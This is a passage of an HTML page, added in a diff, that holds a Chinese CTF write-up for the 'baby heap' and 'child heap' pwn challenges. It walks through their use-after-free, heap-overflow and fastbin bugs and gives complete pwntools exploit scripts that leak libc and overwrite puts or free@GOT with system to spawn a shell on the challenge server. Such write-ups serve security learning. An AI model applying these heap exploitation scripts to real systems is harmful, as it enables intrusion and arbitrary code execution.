+<span class="sd">&#39;&#39;&#39;</span>
+</pre></div>
+
+<p>PS：本题原来是开了canary防护的，后来重新编译的时候忘记了加，因此exp中还有leak canary这一步。</p>
+<p>PPS：本题彩蛋：比赛第一天是6月8号，刚好是高考第二天，因此题目中的故事都是高考背景。缅怀大家逝去的高中青春。</p>
+<h3 id="baby-heap">baby heap<a class="headerlink" href="#baby-heap" title="Permanent link">&para;</a></h3>
+<h5 id="checksec_2">checksec分析<a class="headerlink" href="#checksec_2" title="Permanent link">&para;</a></h5>
+<div class="codehilite"><pre><span></span>[*] &#39;/home/ljb/ctf/aurora/double/double&#39;
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+</pre></div>
+
+<p>除了RELRO，其他全开。</p>
+<h5 id="ida-f5_1">IDA F5分析<a class="headerlink" href="#ida-f5_1" title="Permanent link">&para;</a></h5>
+<p>主要功能：</p>
+<ol>
+<li>add info，申请一个0x10大小的堆。前8字节存message地址，后8字节存puts函数地址。message是根据输入大小malloc的堆。</li>
+<li>del info，删除info。这里是先删除info堆，再删除对应message堆，同时存在UAF漏洞。</li>
+<li>show info，输入info index输出对应message存的信息。注意这里的输出调用的是info中的puts地址。这里index管理很好不存在溢出。</li>
+</ol>
+<h5 id="_3">解题思路：<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h5>
+<p>由于存在UAF，因此可以考虑利用fastbin的特性。先leak出libc，然后把puts函数地址改为system函数地址，message写'/bin/sh'，从而执行system('/bin/sh') get shell。</p>
+<h5 id="exp_2">exp：<a class="headerlink" href="#exp_2" title="Permanent link">&para;</a></h5>
+<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">elf</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;double&quot;</span><span class="p">)</span>
+<span class="c1">#io=elf.process()</span>
+<span class="c1">#io=elf.process(,env={&#39;LD_PRELOAD&#39;:&#39;.so&#39;})</span>
+<span class="n">io</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s2">&quot;123.207.32.26&quot;</span><span class="p">,</span><span class="mi">9001</span><span class="p">)</span>
+<span class="n">libc</span><span class="o">=</span><span class="n">elf</span><span class="o">.</span><span class="n">libc</span>
+<span class="c1">#libc=ELF(&quot;&quot;)</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
+
+<span class="n">sla</span><span class="o">=</span><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span>
+<span class="n">sl</span><span class="o">=</span><span class="n">io</span><span class="o">.</span><span class="n">sendline</span>
+<span class="n">sa</span><span class="o">=</span><span class="n">io</span><span class="o">.</span><span class="n">sendafter</span>
+<span class="n">ru</span><span class="o">=</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span>
+<span class="n">shell</span><span class="o">=</span><span class="n">io</span><span class="o">.</span><span class="n">interactive</span>
+
+<span class="k">def</span> <span class="nf">menu</span><span class="p">(</span><span class="n">choice</span><span class="p">):</span>
+    <span class="n">sla</span><span class="p">(</span><span class="s2">&quot;choice:</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">choice</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">addinfo</span><span class="p">(</span><span class="n">length</span><span class="p">,</span><span class="n">message</span><span class="o">=</span><span class="s1">&#39;jb&#39;</span><span class="p">):</span>
+    <span class="n">menu</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">sla</span><span class="p">(</span><span class="s2">&quot;length</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">length</span><span class="p">))</span>
+    <span class="n">sa</span><span class="p">(</span><span class="s2">&quot;message</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="n">message</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">delinfo</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+    <span class="n">menu</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+    <span class="n">sla</span><span class="p">(</span><span class="s2">&quot;delete</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">showinfo</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+    <span class="n">menu</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+    <span class="n">sla</span><span class="p">(</span><span class="s2">&quot;watch</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+
+<span class="n">addinfo</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span><span class="c1">#申请和info同样大小的堆，从而使得message和info被free后进入同一个fastbin</span>
+<span class="n">delinfo</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">addinfo</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span><span class="c1">#因为上面后free的是message堆，因此info[1]申请的是info[0]-&gt;message，info[1]-&gt;message申请的是info[0]</span>
+<span class="n">showinfo</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="c1">#由于info[1]-&gt;message申请的是info[0]，因此后8字节是puts函数地址，从而leak libc</span>
+<span class="n">ru</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
+<span class="n">puts_addr</span><span class="o">=</span><span class="n">ru</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="bp">True</span><span class="p">)</span>
+<span class="n">puts_addr</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">puts_addr</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\x00\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">libcbase</span><span class="o">=</span><span class="n">puts_addr</span><span class="o">-</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
+<span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libcbase</span><span class="p">)</span>
+<span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">=</span><span class="n">libcbase</span>
+
+<span class="n">addinfo</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span>
+<span class="n">delinfo</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">addinfo</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">next</span><span class="p">())</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]))</span><span class="c1">#重新申请，参考上面的操作，把info-&gt;message改为&#39;/bin/sh&#39;地址，puts函数地址改为system函数地址</span>
+<span class="n">showinfo</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="c1">#通过show功能触发system函数</span>
+<span class="n">shell</span><span class="p">()</span>
+</pre></div>
+
+<p>PS：本题题目跟国赛一致，都是double，但利用方法都不是double free。本题flag为Aurora{n0t_double_free_bu7_double_types_2333}。意在说明double并不一定是指double free，有可能是指两种堆的类型double type，不要被惯性思维了，因此这题也算类型混淆的一种。</p>
+<h2 id="child-heap">child heap<a class="headerlink" href="#child-heap" title="Permanent link">&para;</a></h2>
+<h5 id="checksec_3">checksec分析<a class="headerlink" href="#checksec_3" title="Permanent link">&para;</a></h5>
+<div class="codehilite"><pre><span></span>[*] &#39;/home/ljb/ctf/aurora/notebook/notebook&#39;
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</pre></div>
+
+<h5 id="ida-f5ida">IDA F5分析（本题IDA分析文件也在链接中）<a class="headerlink" href="#ida-f5ida" title="Permanent link">&para;</a></h5>
+<p>主要功能：</p>
+<ol>
+<li>new，按照输入的大小申请堆，在全局数组record中，先存size，再存堆地址。注意题目中写的read函数需要输入回车来结束，否则长度不够就会直接exit(1)。</li>
+<li>edit，先输入index，再输入大小，然后对record中index对应的堆内容进行编辑。这里对输入大小不检查，因此存在堆溢出。</li>
+<li>delete，输入index，释放堆，同时把record中的size和堆地址置0。这里存在数组越界。</li>
+<li>look，输入index，查看对应堆信息。这里同样存在数组越界。</li>
+</ol>
+<h5 id="_4">解题思路：<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h5>
+<p>由于存在堆溢出，且对申请堆的size无限制，因此可以考虑fastbin attack中的Arbitrary Alloc，伪造堆到全局数组record中，从而控制record的内容。由于没有开启FULL RELRO，因此可以考虑改GOT表。把free改成system从而get shell。</p>
+<h5 id="exp_3">exp:<a class="headerlink" href="#exp_3" title="Permanent link">&para;</a></h5>
+<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">elf</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;notebook&quot;</span><span class="p">)</span>
+<span class="c1">#io=elf.process()</span>
+<span class="c1">#io=elf.process(,env={&#39;LD_PRELOAD&#39;:&#39;.so&#39;})</span>
+<span class="n">io</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s2">&quot;123.207.32.26&quot;</span><span class="p">,</span><span class="mi">9003</span><span class="p">)</span>
+<span class="n">libc</span><span class="o">=</span><span class="n">elf</span><span class="o">.</span><span class="n">libc</span>
+<span class="c1">#libc=ELF(&quot;&quot;)</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
+
+<span class="n">sla</span><span class="o">=</span><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span>
+<span class="n">sl</span><span class="o">=</span><span class="n">io</span><span class="o">.</span><span class="n">sendline</span>
+<span class="n">sa</span><span class="o">=</span><span class="n">io</span><span class="o">.</span><span class="n">sendafter</span>
+<span class="n">ru</span><span class="o">=</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span>
+<span class="n">shell</span><span class="o">=</span><span class="n">io</span><span class="o">.</span><span class="n">interactive</span>
+
+<span class="k">def</span> <span class="nf">menu</span><span class="p">(</span><span class="n">choice</span><span class="p">):</span>
+    <span class="n">sla</span><span class="p">(</span><span class="s2">&quot;your choice?</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">choice</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">new</span><span class="p">(</span><span class="n">size</span><span class="p">,</span><span class="n">content</span><span class="o">=</span><span class="s1">&#39;jb</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">):</span>
+    <span class="n">menu</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">sla</span><span class="p">(</span><span class="s2">&quot;notebook:</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+    <span class="n">sa</span><span class="p">(</span><span class="s2">&quot;content:</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="n">content</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">index</span><span class="p">,</span><span class="n">size</span><span class="p">,</span><span class="n">content</span><span class="p">):</span>
+    <span class="n">menu</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+    <span class="n">sla</span><span class="p">(</span><span class="s2">&quot;notebook:</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+    <span class="n">sla</span><span class="p">(</span><span class="s2">&quot;lenth of notebook:</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+    <span class="n">menu</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+    <span class="n">sla</span><span class="p">(</span><span class="s2">&quot;index:</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">look</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+    <span class="n">menu</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+    <span class="n">sla</span><span class="p">(</span><span class="s2">&quot;index:</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+
+<span class="c1">#gdb.attach(io)</span>
+<span class="n">new</span><span class="p">(</span><span class="mh">0x61</span><span class="p">)</span><span class="c1">#0</span>
+<span class="n">new</span><span class="p">(</span><span class="mh">0x50</span><span class="p">)</span><span class="c1">#1</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="c1">#此时fastbin中只有堆1</span>
+<span class="n">payload</span><span class="o">=</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x60</span><span class="c1">#填充堆0</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x61</span><span class="p">)</span><span class="c1">#堆1的prev_size和size</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x6020a0</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="c1">#伪造堆1的fd，指向record-8，此时record[0]-&gt;size存的是0x61，和堆1的size域相同，和堆1处于同一个fastbin</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x80</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">new</span><span class="p">(</span><span class="mh">0x50</span><span class="p">)</span><span class="c1">#1，原来的堆1</span>
+<span class="n">new</span><span class="p">(</span><span class="mh">0x50</span><span class="p">)</span><span class="c1">#2，fake heap，堆地址是&amp;record[-1]-&gt;mesg_addr，userdata地址（即malloc返回的地址）是&amp;record[0]-&gt;mesg_addr</span>
+<span class="n">new</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00\n</span><span class="s1">&#39;</span><span class="p">)</span><span class="c1">#3</span>
+<span class="n">payload</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;free&#39;</span><span class="p">])</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mh">0x10</span><span class="p">,</span><span class="n">payload</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span><span class="c1">#相当于改了record[0]-&gt;mesg_addr为free的got表地址</span>
+
+<span class="c1">#leak libc</span>
+<span class="n">look</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="c1">#由于record[0]-&gt;mesg_addr=free@got，因此查看会直接得到free的got表内容即free实际地址</span>
+<span class="n">ru</span><span class="p">(</span><span class="s2">&quot;0:&quot;</span><span class="p">)</span>
+<span class="n">mesg</span><span class="o">=</span><span class="n">ru</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="bp">True</span><span class="p">)</span>
+<span class="n">free_addr</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">mesg</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\x00\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">libcbase</span><span class="o">=</span><span class="n">free_addr</span><span class="o">-</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;free&#39;</span><span class="p">]</span>
+<span class="k">print</span> <span class="s2">&quot;libcbase:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libcbase</span><span class="p">)</span>
+<span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">=</span><span class="n">libcbase</span>
+
+<span class="n">payload</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">])[</span><span class="mi">0</span><span class="p">:</span><span class="mi">7</span><span class="p">]</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x10</span><span class="p">,</span><span class="n">payload</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span><span class="c1">#改*(record[0]-&gt;mesg_addr)为system地址</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span><span class="c1">#调用system(&#39;/bin/sh&#39;)</span>
+<span class="n">shell</span><span class="p">()</span>
+</pre></div>
+                
+                  
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid">
+        
+          <a href=".." title="Welcome to MkDocs" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
+            </div>
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  Previous
+                </span>
+                Welcome to MkDocs
+              </span>
+            </div>
+          </a>
+        
+        
+          <a href="../pragyan-ctf2019-pwn部分wp/" title="pragyan ctf2019 pwn部分wp" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  Next
+                </span>
+                pragyan ctf2019 pwn部分wp
+              </span>
+            </div>
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
+            </div>
+          </a>
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+        powered by
+        <a href="https://www.mkdocs.org">MkDocs</a>
+        and
+        <a href="https://squidfunk.github.io/mkdocs-material/">
+          Material for MkDocs</a>
+      </div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../assets/javascripts/application.ac79c3b0.js"></script>
+      
+      <script>app.initialize({version:"1.0.4",url:{base:".."}})</script>
+      
+    
+  </body>
+</html>
